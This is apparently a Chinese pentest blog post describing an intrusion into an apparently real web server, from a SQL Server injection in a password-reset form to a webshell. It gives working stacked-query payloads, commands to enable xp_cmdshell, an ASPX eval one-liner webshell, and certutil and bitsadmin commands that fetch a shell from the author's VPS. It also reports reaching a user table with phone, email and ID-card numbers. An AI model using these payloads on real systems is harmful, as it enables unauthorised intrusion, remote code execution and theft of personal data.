---
date: 2019-03-02 20:23:35
title: 从 SQL Server 注入到 getshell
description: SQLServer 多语句查询 SQL 注入，读网站路径然后写 shell
categories:
  - Pentest
tags:
  - getshell
  - SQL注入
---

### 0x00 目标情况
* 一个web站点111.\*.\*.63，只有一个登陆框，测试了没有注入，没有弱口令
* 扫描了全端口，没有发现什么有用的信息

### 0x01 发现注入
当时是查看网页源代码，有两个可疑接口，一个是初始化密码借口，访问返回空白页面，没有什么用

另一个是密码设置接口，不过这个接口是同网段的另一个ip 111.\*.\*.59，访问后发现是个重置密码的界面
![80](/img/post/Xnip2019-03-03_14-50-18.png)

但是进行密码重置的时候需要发送验证码，系统会先校验用户名是否存在，加单引号出错，and 1=2没反应

burpsuite抓包后sqlmap跑了下，python sqlmap.py -r 1.txt，存在注入
![80](/img/post/Xnip2019-03-03_16-00-32.png)

通过sqlmap得到了这几个数据库
```
[*] HSOA_20170320
[*] HSOA_NEW
[*] HSOA_T
[*] master
[*] model
[*] msdb
[*] Shuttle
[*] SHWT
[*] tempdb
```

### 0x02 找网站绝对路径
* 判断是不是dba权限(延时后返回正确页面，确定为dba权限<也可用sqlmap的--is-dba判断>)

```
uname=test';if(1=(select is_srvrolemember('sysadmin'))) WAITFOR DELAY '0:0:2';--
```

* 判断是否是站库分离(延时后返回正确页面，确定站库没有分离)

```sql
uname=test';if(host_name()=@@servername) WAITFOR DELAY '0:0:5';--
```

* 查看是否有xp_cmdshell

```
uname=test';if(1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')) WAITFOR DELAY '0:0:2'--
```
```
恢复／删除xp_cmdshell
exec sp_addextendedproc xp_cmdshell,@dllname='xplog70.dll'
exec sp_dropextendedproc 'xplog70.dll'
```

* 开启xp_cmdshell

```
# 关闭xp_cmdshell
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',0;
RECONFIGURE;

# 启用xp_cmdshell
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

* 得到网站绝对路径

可以找一个在网站中的文件，然后可以用```dir /s /b d:\"aa.txt"```或者 for /r d:\ %i in (aa.txt) do echo %i来得到路径

查看网页源代码发现引入了js脚本```"<script src="/Content/layer/layer.js"></script>"```，就查找layer.js吧

本来想使用sqlmap的-\-os-shell直接执行命令试试，python sqlmap.py -r 1.txt --os-shell，但是发现执行命令的话一直没有数据返回


那就手工注入找路径，先建表，将路径插入表，然后得到表内容

```
--在数据库tempdb下创建临时表tt_tmp
uname=test';use tempdb;create table tt_tmp (tmp1 varchar(1000));--
```

sqlmap查看建表成功，```sqlmap -r 1.txt --dbms "Microsoft SQL Server" -D "tempdb" --tables```
![40](/img/post/Xnip2019-03-03_18-16-01.png)

```
--查找网站文件并把路径写入到表tt_tmp
uname=test';use tempdb;insert into tt_tmp(tmp1) exec master..xp_cmdshell 'dir /s /b d:\layer.js';--
```

用sqlmap得到表tt_tmp的内容: ```python sqlmap.py -r 1.txt --dbms="Microsoft SQL Server" --technique=S -D "tempdb" -T "tt_tmp" -C "tmp1" --dump -v 3```
![65](/img/post/Xnip2019-02-28_10-01-37.png)

### 0x03 尝试在111.\*.\*.59主机getshell
* 尝试写一句话

先在下面的路径中写入txt文件验证网站路径到底是哪一个

```
D:\bak\20170226\bak\20170403.2\webapp\Content\layer\
D:\bak\20170226\bak\20170404.2\webapp\Content\layer\
D:\bak\20170226\bak\20170404.3\webapp\Content\layer\
D:\bak\20170226\bak\20170404\webapp\Content\layer\
D:\bak\20170226\bak\20170405\webapp\Content\layer\
D:\bak\20170226\bak\20170407\webapp\Content\layer\
D:\bak\20170226\bak\20180103\webapp\Content\layer\
D:\bak\20170226\bak\20180320\webapp\Content\layer\
D:\bak\20170226\webapp\Content\layer\
D:\bak\20170226\webappYM\Content\layer\
D:\WEBAPP\Content\layer\
```

```sql
uname=test';exec master..xp_cmdshell 'echo test >D:\bak\20170226\bak\20170403.2\webapp\Content\layer\11.txt';--
```
依次写文件然后访问，在写入 ```D:\bak\20170226\webapp\Content\layer\123.txt```时，访问```http://111.*.*.59/Content/layer/123.txt```能正常访问到123.txt，返回内容为test，证明web路径就是D:\bak\20170226\webapp\

尝试写入一句话(< >的前面要加^)
```sql
uname=test';exec master..xp_cmdshell 'echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.item["Aa1234567"],"unsafe");%^> > D:\bak\20170226\webapp\Content\layer\cc.aspx';--
```

访问时可以看到aa.aspx确实写入了，但是菜刀连接不上
![70](/img/post/Xnip2019-03-03_20-25-24.png)

* 尝试直接下载shell到服务器

使用bitsadmin下载时并没有成功，访问```http://111.*.*.59/Content/layer/aaa.aspx```返回404
```sql
uname=test';exec master..xp_cmdshell 'bitsadmin /rawreturn /transfer getfile http://my-vps/aaa.aspx D:\bak\20170226\webapp\Content\layer\aaa.aspx';--
```

使用certutil下载时才成功，得到shell地址```http://111.*.*.59/Content/layer/aaa.aspx```
```sql
uname=test';exec master..xp_cmdshell 'certutil -urlcache -split -f http://my-vps/aaa.aspx D:\bak\20170226\webapp\Content\layer\aaa.aspx';--
```
![70](/img/post/Xnip2019-03-03_20-42-24.png)

### 0x04 查数据库相关信息
* 找到数据库配置文件
![80](/img/post/Xnip2019-03-05_10-25-52.png)
![90](/img/post/Xnip2019-03-05_10-34-10.png)
![90](/img/post/Xnip2019-03-05_10-37-28.png)

* 尝试登陆

找到了用户表，有用户名、密码、姓名、手机号、邮箱、身份证号
![80](/img/post/Xnip2019-03-05_11-00-44.png)
在111.\*.\*.63登陆发现它只是个登陆接口，真正网站是在111.\*.\*.59的
![60](/img/post/Xnip2019-03-05_11-03-08.png)


### 0x05 附：sqlmap得到路径的语句分析
```sql
cast转换数据类型
isnull判断数据是否为空，为空的话返回char(32)
unicode字符转换为10进制数字

IF(UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(tmp1 AS NVARCHAR(4000)),CHAR(32))) FROM tempdb.dbo.tt_tmp),1,1))>32) WAITFOR DELAY '0:0:1';

IF(UNICODE(SUBSTRING((SELECT MIN(ISNULL(CAST(tmp1 AS NVARCHAR(4000)),CHAR(32))) FROM tempdb.dbo.tt_tmp WHERE CONVERT(NVARCHAR(4000),tmp1)>'D:\WEBAPP\Content\layer\layer.js'),1,1))>16) WAITFOR DELAY '0:0:1';
```



#### Reference(侵删)：
* [https://www.cnblogs.com/backlion/p/6869595.html](https://www.cnblogs.com/backlion/p/6869595.html?_blank)


